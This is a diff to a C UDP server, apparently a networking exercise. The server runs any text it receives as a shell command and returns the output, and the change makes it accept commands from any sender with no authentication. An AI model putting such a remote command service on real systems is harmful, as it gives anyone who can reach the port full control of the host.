@@ -47,8 +47,9 @@ static int check_IP_version(const char *ip, int port, struct sockaddr_storage *a
 }
 
 int main(int argc, char** argv){
-  if(argc != 5){
-    fprintf(stderr, "Usage: %s <local IP address > <local PORT> <client IP addres> <client PORT number>\n",argv[0]);
+
+  if(argc != 3){
+    fprintf(stderr, "Usage: %s <local IP address > <local PORT>\n",argv[0]);
     exit(EXIT_FAILURE);
   }
 
@@ -57,12 +58,7 @@ int main(int argc, char** argv){
         fprintf(stderr, "[-]PORT (must be 1-65535)\n");
         exit(EXIT_FAILURE);
     }
-    int client_port  = check_port(argv[4]);
-    if (client_port < 0) {
-        fprintf(stderr, "[-]PORT (must be 1-65535)\n");
-        exit(EXIT_FAILURE);
-    }
-
+  
     struct sockaddr_storage local_addr, client_addr;
     socklen_t local_addr_len, client_addr_len;
 
@@ -70,15 +66,7 @@ int main(int argc, char** argv){
         fprintf(stderr, "[-] Invalid local IP address\n");
         exit(EXIT_FAILURE);
     }
-    if (check_IP_version(argv[3], client_port, &client_addr, &client_addr_len) < 0) {
-        fprintf(stderr, "[-] Invalid server IP address\n");
-        exit(EXIT_FAILURE);
-    }
-    if (client_addr.ss_family != local_addr.ss_family) {
-        fprintf(stderr, "[-] Local IP and server IP must be the same version (both IPv4 or both IPv6)\n");
-        exit(EXIT_FAILURE);
-    }
-
+    
     
     int sockfd = socket(local_addr.ss_family, SOCK_DGRAM, 0);
     if (sockfd < 0) {
@@ -106,20 +94,13 @@ int main(int argc, char** argv){
         close(sockfd);
         exit(EXIT_FAILURE);
     }
-
-    if (connect(sockfd, (struct sockaddr *)&client_addr, client_addr_len) < 0) {
-        perror("[-] CONNECT");
-        close(sockfd);
-        exit(EXIT_FAILURE);
-    }
-
-  
-
+   
     while(1) {
     char buff[1024];
-    ssize_t recved = recv(sockfd, buff, sizeof(buff) - 1, 0);
+    client_addr_len = sizeof(client_addr);
+    ssize_t recved = recvfrom(sockfd, buff, sizeof(buff) - 1, 0, (struct sockaddr*)& client_addr, &client_addr_len);
     if (recved < 0) {
-        perror("recv[-]");
+        perror("[-]RECV");
         close(sockfd);
         exit(EXIT_FAILURE);
     }
@@ -135,11 +116,9 @@ int main(int argc, char** argv){
     FILE *fp = popen(cmd_with_err, "r");
     if (fp == NULL) {
        const char *err_msg = "Error: failed to execute command\n";
-        send(sockfd, err_msg, strlen(err_msg), 0);
+        sendto(sockfd, err_msg, strlen(err_msg), 0, (struct sockaddr*)& client_addr, client_addr_len);
         continue;
     }
-
-    int cmd = system(buff);
 
     char response[BUFFSIZE];
     size_t read = fread(response, 1, sizeof(response) - 1, fp);
@@ -147,16 +126,19 @@ int main(int argc, char** argv){
 
     if (read > 0) {
         response[read] = '\0';
-        send(sockfd, response, read, 0);
+        sendto(sockfd, response, read, 0, (struct sockaddr*)& client_addr, client_addr_len);
     } else {
         char status_msg[128];
         snprintf(status_msg, sizeof(status_msg),
                  "(Command executed with exit code %d, no stdout output)\n",
                  WEXITSTATUS(status));
-        send(sockfd, status_msg, strlen(status_msg), 0);
+        sendto(sockfd, status_msg, strlen(status_msg), 0, (struct sockaddr*)& client_addr, client_addr_len);
     }
   }
-  close(sockfd);
+  if(close(sockfd) < 0 ) {
+    perror("[-]CLOSE SOCKET");
+    exit(EXIT_FAILURE);
+  }
 
  return 0;
 }
